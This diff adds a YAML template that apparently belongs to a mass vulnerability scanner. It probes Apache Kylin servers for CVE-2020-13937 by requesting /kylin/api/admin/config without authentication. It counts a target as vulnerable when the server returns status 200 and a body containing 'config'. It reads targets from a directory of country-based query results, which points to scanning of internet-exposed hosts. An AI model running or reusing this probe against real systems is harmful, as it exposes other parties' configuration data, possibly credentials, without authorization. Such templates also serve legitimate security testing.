@@ -1,0 +1,15 @@
+targetPath: /kylin/api/admin/config
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: config
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/Apache_Kylin_config_未授权配置泄露_CVE_2020_13937
+targetRestText: 2
